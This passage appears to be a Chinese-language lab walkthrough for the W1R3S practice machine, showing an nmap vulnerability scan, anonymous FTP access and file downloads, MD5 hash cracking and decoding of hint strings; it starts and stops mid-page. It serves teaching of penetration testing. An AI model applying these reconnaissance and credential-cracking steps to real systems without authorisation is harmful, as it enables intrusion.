20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:默认脚本扫描 class=headings>默认脚本扫描</a></h3>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo nmap --script<span class=o>=</span>vuln -p21,22,80,3306 10.10.10.130
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting Nmap 7.94SVN <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2024-03-27 23:17 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.130
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00041s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE
</span></span><span class=line><span class=cl>21/tcp   open  ftp
</span></span><span class=line><span class=cl>22/tcp   open  ssh
</span></span><span class=line><span class=cl>80/tcp   open  http
</span></span><span class=line><span class=cl><span class=p>|</span>_http-dombased-xss: Couldn<span class=s1>&#39;t find any DOM based XSS.
</span></span></span><span class=line><span class=cl><span class=s1>|_http-stored-xss: Couldn&#39;</span>t find any stored XSS vulnerabilities.
</span></span><span class=line><span class=cl><span class=p>|</span>_http-csrf: Couldn<span class=s1>&#39;t find any CSRF vulnerabilities.
</span></span></span><span class=line><span class=cl><span class=s1>| http-enum: 
</span></span></span><span class=line><span class=cl><span class=s1>|_  /wordpress/wp-login.php: Wordpress login page.
</span></span></span><span class=line><span class=cl><span class=s1>| http-slowloris-check: 
</span></span></span><span class=line><span class=cl><span class=s1>|   VULNERABLE:
</span></span></span><span class=line><span class=cl><span class=s1>|   Slowloris DOS attack
</span></span></span><span class=line><span class=cl><span class=s1>|     State: LIKELY VULNERABLE
</span></span></span><span class=line><span class=cl><span class=s1>|     IDs:  CVE:CVE-2007-6750
</span></span></span><span class=line><span class=cl><span class=s1>|       Slowloris tries to keep many connections to the target web server open and hold
</span></span></span><span class=line><span class=cl><span class=s1>|       them open as long as possible.  It accomplishes this by opening connections to
</span></span></span><span class=line><span class=cl><span class=s1>|       the target web server and sending a partial request. By doing so, it starves
</span></span></span><span class=line><span class=cl><span class=s1>|       the http server&#39;</span>s resources causing Denial Of Service.
</span></span><span class=line><span class=cl><span class=p>|</span>     
</span></span><span class=line><span class=cl><span class=p>|</span>     Disclosure date: 2009-09-17
</span></span><span class=line><span class=cl><span class=p>|</span>     References:
</span></span><span class=line><span class=cl><span class=p>|</span>       http://ha.ckers.org/slowloris/
</span></span><span class=line><span class=cl><span class=p>|</span>_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class=o>=</span>CVE-2007-6750
</span></span><span class=line><span class=cl>3306/tcp open  mysql
</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:B8:7B:3D <span class=o>(</span>VMware<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 321.46 seconds
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>未找到 <code>XSS</code>、<code>CSRF</code> 可以利用的点。但是找到了一个 <code>/wordpress/wp-login.php</code> 。</p>
<p>探测出当前 <code>Apache</code> 可能存在 CVE-2007-6750<sup>(Apache HTTP Server 1.x 和 2.x 允许远程攻击者通过部分 HTTP 请求造成拒绝服务（守护进程中断）)</sup> 攻击。</p>
<p>‍</p>
<h2 id=编排攻击方向><a href=#编排攻击方向 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:编排攻击方向 class=headings>编排攻击方向</a></h2>
<p>根据以上内容收集的信息，初步选定操作顺序如下：</p>
<p><strong>排查</strong>下：<code>ftp 21</code>、<code>mysql 3306</code> 这里的 <code>ftp</code> 有没有可能存在信息泄露，<code>mysql</code> 有没弱密码。</p>
<p>接着<strong>重点</strong>查看：<code>web 80</code>、<code>ssh 22</code> 这里的 <code>80</code> 端口是必须看的，很多攻击点就是 <code>Web</code>，<code>ssh</code> 一般没有价值，放到最后。</p>
<p>‍</p>
<h2 id=ftp-渗透><a href=#ftp-渗透 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:ftp-渗透 class=headings>FTP 渗透</a></h2>
<p>在 <code>nmap</code> 扫描阶段就提示了 <code>FTP</code> 有 <code>anonymous</code> 登录，登录进去看看。</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ftp 10.10.10.130
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Connected to 10.10.10.130.
</span></span><span class=line><span class=cl><span class=m>220</span> Welcome to W1R3S.inc FTP service.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Name <span class=o>(</span>10.10.10.130:kali<span class=o>)</span>: anonymous 
</span></span><span class=line><span class=cl><span class=m>331</span> Please specify the password.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Password: 
</span></span><span class=line><span class=cl><span class=m>230</span> Login successful.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Remote system <span class=nb>type</span> is UNIX.
</span></span><span class=line><span class=cl>Using binary mode to transfer files.
</span></span><span class=line><span class=cl>ftp&gt; 
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>这里提示 <code>Using binary mode to transfer files.</code> 用二进制模式传输文件，在这里通过 <code>binary</code> 来切换到二进制模式。</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ftp&gt; binary
</span></span><span class=line><span class=cl><span class=m>200</span> Switching to Binary mode.
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>查看文件 <code>ls</code>，在 <code>content</code> 文件夹内找到了三个文件，都把它下载下来。</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ftp&gt; ls
</span></span><span class=line><span class=cl><span class=m>229</span> Entering Extended Passive Mode <span class=o>(||</span><span class=p>|</span>47557<span class=p>|</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=m>150</span> Here comes the directory listing.
</span></span><span class=line><span class=cl>-rw-r--r--    <span class=m>1</span> ftp      ftp            <span class=m>29</span> Jan <span class=m>23</span>  <span class=m>2018</span> 01.txt
</span></span><span class=line><span class=cl>-rw-r--r--    <span class=m>1</span> ftp      ftp           <span class=m>165</span> Jan <span class=m>23</span>  <span class=m>2018</span> 02.txt
</span></span><span class=line><span class=cl>-rw-r--r--    <span class=m>1</span> ftp      ftp           <span class=m>582</span> Jan <span class=m>23</span>  <span class=m>2018</span> 03.txt
</span></span><span class=line><span class=cl><span class=m>226</span> Directory send OK.
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>先执行一个 <code>prompt</code> 把交互模式给关掉（这样下载文件就不会每次都找我确定了）。接着使用 <code>mget</code> 命令下载多个文件。</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ftp&gt; prompt
</span></span><span class=line><span class=cl>Interactive mode off.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ftp&gt; mget *.txt
</span></span><span class=line><span class=cl>local: 01.txt remote: 01.txt
</span></span><span class=line><span class=cl><span class=m>229</span> Entering Extended Passive Mode <span class=o>(||</span><span class=p>|</span>49066<span class=p>|</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=m>150</span> Opening BINARY mode data connection <span class=k>for</span> 01.txt <span class=o>(</span><span class=m>29</span> bytes<span class=o>)</span>.
</span></span><span class=line><span class=cl>100% <span class=p>|</span>**************************************************************************************************<span class=p>|</span>    <span class=m>29</span>        7.51 KiB/s    00:00 ETA
</span></span><span class=line><span class=cl><span class=m>226</span> Transfer complete.
</span></span><span class=line><span class=cl><span class=m>29</span> bytes received in 00:00 <span class=o>(</span>6.48 KiB/s<span class=o>)</span>
</span></span><span class=line><span class=cl>local: 02.txt remote: 02.txt
</span></span><span class=line><span class=cl><span class=m>229</span> Entering Extended Passive Mode <span class=o>(||</span><span class=p>|</span>49316<span class=p>|</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=m>150</span> Opening BINARY mode data connection <span class=k>for</span> 02.txt <span class=o>(</span><span class=m>165</span> bytes<span class=o>)</span>.
</span></span><span class=line><span class=cl>100% <span class=p>|</span>**************************************************************************************************<span class=p>|</span>   <span class=m>165</span>      302.88 KiB/s    00:00 ETA
</span></span><span class=line><span class=cl><span class=m>226</span> Transfer complete.
</span></span><span class=line><span class=cl><span class=m>165</span> bytes received in 00:00 <span class=o>(</span>155.53 KiB/s<span class=o>)</span>
</span></span><span class=line><span class=cl>local: 03.txt remote: 03.txt
</span></span><span class=line><span class=cl><span class=m>229</span> Entering Extended Passive Mode <span class=o>(||</span><span class=p>|</span>49684<span class=p>|</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=m>150</span> Opening BINARY mode data connection <span class=k>for</span> 03.txt <span class=o>(</span><span class=m>582</span> bytes<span class=o>)</span>.
</span></span><span class=line><span class=cl>100% <span class=p>|</span>**************************************************************************************************<span class=p>|</span>   <span class=m>582</span>        1.77 MiB/s    00:00 ETA
</span></span><span class=line><span class=cl><span class=m>226</span> Transfer complete.
</span></span><span class=line><span class=cl><span class=m>582</span> bytes received in 00:00 <span class=o>(</span>702.54 KiB/s<span class=o>)</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p><code>docs</code> 文件夹里面也有一个文件，使用 <code>get</code> 下载下来。</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ftp&gt; ls
</span></span><span class=line><span class=cl><span class=m>229</span> Entering Extended Passive Mode <span class=o>(||</span><span class=p>|</span>40355<span class=p>|</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=m>150</span> Here comes the directory listing.
</span></span><span class=line><span class=cl>-rw-r--r--    <span class=m>1</span> ftp      ftp           <span class=m>138</span> Jan <span class=m>23</span>  <span class=m>2018</span> worktodo.txt
</span></span><span class=line><span class=cl><span class=m>226</span> Directory send OK.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ftp&gt; get worktodo.txt
</span></span><span class=line><span class=cl>local: worktodo.txt remote: worktodo.txt
</span></span><span class=line><span class=cl><span class=m>229</span> Entering Extended Passive Mode <span class=o>(||</span><span class=p>|</span>45620<span class=p>|</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=m>150</span> Opening BINARY mode data connection <span class=k>for</span> worktodo.txt <span class=o>(</span><span class=m>138</span> bytes<span class=o>)</span>.
</span></span><span class=line><span class=cl>100% <span class=p>|</span>**************************************************************************************************<span class=p>|</span>   <span class=m>138</span>       21.21 KiB/s    00:00 ETA
</span></span><span class=line><span class=cl><span class=m>226</span> Transfer complete.
</span></span><span class=line><span class=cl><span class=m>138</span> bytes received in 00:00 <span class=o>(</span>19.41 KiB/s<span class=o>)</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p><code>new-employees</code> 文件夹里面的同理。接着使用 <code>quit</code> 退出 <code>ftp</code>，然后 <code>cat</code> 查看文件内容。</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat *.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>New FTP Server For W1R3S.inc
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl>01ec2d8fc11c493b25029fb1f47f39ce
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=nv>SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg</span><span class=o>==</span>
</span></span><span class=line><span class=cl><span class=c1>############################################</span>
</span></span><span class=line><span class=cl>___________.__              __      __  ______________________   _________    .__             
</span></span><span class=line><span class=cl><span class=se>\_</span>_    ___/<span class=p>|</span>  <span class=p>|</span>__   ____   /  <span class=se>\ </span>   /  <span class=se>\/</span>_   <span class=se>\_</span>_____   <span class=se>\_</span>____  <span class=se>\ </span>/   _____/    <span class=p>|</span>__<span class=p>|</span> ____   ____  
</span></span><span class=line><span class=cl>  <span class=p>|</span>    <span class=p>|</span>   <span class=p>|</span>  <span class=p>|</span>  <span class=se>\_</span>/ __ <span class=se>\ </span> <span class=se>\ </span>  <span class=se>\/\/</span>   / <span class=p>|</span>   <span class=o>||</span>       _/ _<span class=o>(</span>__  &lt; <span class=se>\_</span>____  <span class=se>\ </span>    <span class=p>|</span>  <span class=p>|</span>/    <span class=se>\_</span>/ ___<span class=se>\ </span>
</span></span><span class=line><span class=cl>  <span class=p>|</span>    <span class=p>|</span>   <span class=p>|</span>   Y  <span class=se>\ </span> ___/   <span class=se>\ </span>       /  <span class=p>|</span>   <span class=o>||</span>    <span class=p>|</span>   <span class=se>\/</span>       <span class=se>\/</span>        <span class=se>\ </span>   <span class=p>|</span>  <span class=p>|</span>   <span class=p>|</span>  <span class=se>\ </span> <span class=se>\_</span>__ 
</span></span><span class=line><span class=cl>  <span class=p>|</span>____<span class=p>|</span>   <span class=p>|</span>___<span class=p>|</span>  /<span class=se>\_</span>__  &gt;   <span class=se>\_</span>_/<span class=se>\ </span> /   <span class=p>|</span>___<span class=o>||</span>____<span class=p>|</span>_  /______  /_______  / /<span class=se>\ </span><span class=p>|</span>__<span class=p>|</span>___<span class=p>|</span>  /<span class=se>\_</span>__  &gt;
</span></span><span class=line><span class=cl>                <span class=se>\/</span>     <span class=se>\/</span>         <span class=se>\/</span>                <span class=se>\/</span>       <span class=se>\/</span>        <span class=se>\/</span>  <span class=se>\/</span>         <span class=se>\/</span>     <span class=se>\/</span> 
</span></span><span class=line><span class=cl>The W1R3S.inc employee list
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Naomi.W - Manager
</span></span><span class=line><span class=cl>Hector.A - IT Dept
</span></span><span class=line><span class=cl>Joseph.G - Web Design
</span></span><span class=line><span class=cl>Albert.O - Web Design
</span></span><span class=line><span class=cl>Gina.L - Inventory
</span></span><span class=line><span class=cl>Rico.D - Human Resources
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ
</span></span><span class=line><span class=cl>                                                                                                                                             
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>通过 <code>hash-identifier</code> 工具和人工猜测：</p>
<blockquote>
<p>（MD5）01ec2d8fc11c493b25029fb1f47f39ce</p>
<p>（Base64）SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==</p>
</blockquote>
<p><code>md5 john</code> 看看：</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;01ec2d8fc11c493b25029fb1f47f39ce&#39;</span> &gt; md5.bash
</span></span><span class=line><span class=cl>john md5.bash
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>时间太慢，借助互联网的力量看看，<strong><a href=https://hashes.com/en/decrypt/hash target=_blank rel=noopener>Hashes Decrypt hash</a></strong> 返回结果为：</p>
<blockquote>
<p>01ec2d8fc11c493b25029fb1f47f39ce: <strong>This is not a password</strong></p>
</blockquote>
<p>验证一下看看是否正确：</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> -n <span class=s1>&#39;This is not a password&#39;</span> <span class=p>|</span> md5sum
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>01ec2d8fc11c493b25029fb1f47f39ce  -
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>接着看看这个 <code>base64</code> 的字符串：<code>SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==</code></p>
<p><code>base64</code> 的特征：<strong>base64 除了数字和大小写字母，剩下的特殊符号只有 3 个</strong>。</p>
<p><code>base64</code> 的辨别方法：</p>
<p>1）看特殊字符，或者说是<strong>正则规则匹配（+ / = 0-9 a-z A-Z）</strong></p>
<p>2） <strong>= 只在文末出现，最多 2 个</strong>，原因是补足。</p>
<p>3）一些特殊情况，稍微复杂一点。主要是针对短字符串，<strong>首先</strong> <strong><code>base64</code></strong> <strong>的字符串一定能被</strong> <strong><code>4</code></strong> <strong>整数。</strong> 比如 <code>root</code> 可以被 <code>4</code> 整除，但它其实并不是 <code>base64</code> 编码，因为解码之后的 <code>ascii</code> 码不在 <code>32-126</code> 之间，会有乱码。所以这里的主要判断方法还是<strong>解码看有没有乱码。</strong> 这里还有一个特例，<strong>就是长度为</strong> <strong><code>1</code></strong> <strong>的非</strong> <strong><code>base64</code></strong> <strong>的字符串解码是空</strong>。</p>
<blockquote>
<p><code>base64</code> 主要功能是把 <code>3</code> 字节的二进制数据编码成 <code>4</code> 字节的文本数据，这样编码的好处是可以直接在邮件或者网页里面展示。</p>
<p>上面说的补足就是补位的意思，把长度不足 <code>3</code> 位倍数的数据填补到 <code>3n</code> 的长度，解码的时候会自动去掉。</p>
<p><code>+</code> 在 <code>url</code> 里面也是特殊的。</p>
</blockquote>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==&#39;</span> <span class=p>|</span> base64 -d
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>It is easy, but not that easy.. 
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>接着看看泄露出来的用户表：</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-txt data-lang=txt><span class=line><span class=cl>The W1R3S.inc employee list （W1R3S.inc 员工名单）
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Naomi.W - Manager       （经理）
</span></span><span class=line><span class=cl>Hector.A - IT Dept      （IT 部门）
</span></span><span class=line><span class=cl>Joseph.G - Web Design   （网页设计）
</span></span><span class=line><span class=cl>Albert.O - Web Design   （网页设计）
</span></span><span class=line><span class=cl>Gina.L - Inventory      （库管）
</span></span><span class=line><span class=cl>Rico.D - Human Resources（人力资源部）
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>在看看这个<strong>上下翻转</strong>、<strong>前后倒序</strong>的字符串，<code>kali</code> 中有个 <code>rev</code> 命令可以解决前后倒序的反转，但是上下的没办法解决，借助互联网的工具吧，使用 Google 搜索描述准确即可。</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-txt data-lang=txt><span class=line><span class=cl>flip reverse upside-down text
</span></span><span class=line><span class=cl> 翻转  颠倒     上下颠倒的  文本
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>找到了一个 <a href=https://www.upsidedowntext.com/ target=_blank rel=noopener>upsidedowntext</a> 网站，可以解决这个问题。</p>
<div class=highlight><div class=chroma>
<div class=table-container><table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-txt data-lang=txt><span class=line><span class=cl>        ı don&#39;t thınk thıs ıs the way to root!
</span></span><span class=line><span class=cl>                                                   
</span></span><span class=line><span class=cl>we have a ןot of work to do‘ stop pןayıng around˙˙˙˙
